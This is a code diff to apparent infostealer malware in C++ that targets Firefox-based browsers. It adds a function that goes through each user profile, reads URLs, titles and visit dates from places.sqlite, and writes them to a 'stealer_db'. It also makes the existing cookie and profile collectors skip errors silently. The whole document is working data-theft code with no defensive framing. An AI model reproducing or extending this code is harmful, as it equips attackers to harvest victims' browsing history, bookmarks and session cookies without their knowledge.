@@ -75,9 +75,11 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 		}
 		catch (const std::filesystem::filesystem_error& e) {
 			//std::cerr << "Filesystem error: " << e.what() << '\n';
+			continue;
 		}
 		catch (const std::exception& e) {
 			//std::cerr << "General exception: " << e.what() << '\n';
+			continue;
 		}
 	}
 
@@ -139,9 +141,11 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 		}
 		catch (const std::filesystem::filesystem_error& e) {
 			//std::cerr << "Filesystem error: " << e.what() << '\n';
+			continue;
 		}
 		catch (const std::exception& e) {
 			//std::cerr << "General exception: " << e.what() << '\n';
+			continue;
 		}
 	}
 
@@ -170,4 +174,67 @@ std::string get_gecko_program_dir(std::string target_user_data)
 
 	std::cerr << "LastPlatformDir not found in the file" << std::endl;
 	return "";
+}
+
+BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
+{
+	std::vector<DataHolder> data_list;
+
+	std::string target_user_data;
+	std::string target_bookmark_data;
+	for (const auto& dir : browsers_gecko) {
+
+		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
+		try {
+			if (exists(target_user_data) && is_directory(target_user_data)) {
+				for (const auto& entry : directory_iterator(target_user_data)) {
+					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
+						//std::cout << entry.path() << '\n';
+
+						target_bookmark_data = entry.path().string() + "\\places.sqlite";
+						sqlite3_stmt* stmt = query_database(target_bookmark_data, "SELECT  url, title, last_visit_date FROM moz_places");
+
+						if (stmt == nullptr)
+							continue;
+
+						while (sqlite3_step(stmt) == SQLITE_ROW)
+						{
+							DataHolder data;
+
+							char* url = (char*)sqlite3_column_text(stmt, 0);
+							char* title = (char*)sqlite3_column_text(stmt, 1);
+							char* last_visit_date = (char*)sqlite3_column_text(stmt, 2);
+
+							if (url != nullptr && title != nullptr && last_visit_date !=nullptr) {
+
+								data.get_bookmarks_manager().setUrl(url);
+								data.get_bookmarks_manager().setHost(dir);
+								data.get_bookmarks_manager().setName(title);
+								data.get_bookmarks_manager().setDateAdded(last_visit_date);
+
+								data_list.push_back(data);
+							}
+							else {
+								// Handle the case where no data is fetched
+								continue;
+							}
+						}
+					}
+				}
+			}
+		}
+		catch (const std::filesystem::filesystem_error& e) {
+			//std::cerr << "Filesystem error: " << e.what() << '\n';
+			continue;
+		}
+		catch (const std::exception& e) {
+			//std::cerr << "General exception: " << e.what() << '\n';
+			continue;
+		}
+	}
+
+	if (!dump_bookmark_data(stealer_db, data_list, data_list.size()))
+		return false;
+
+	return true;
 }
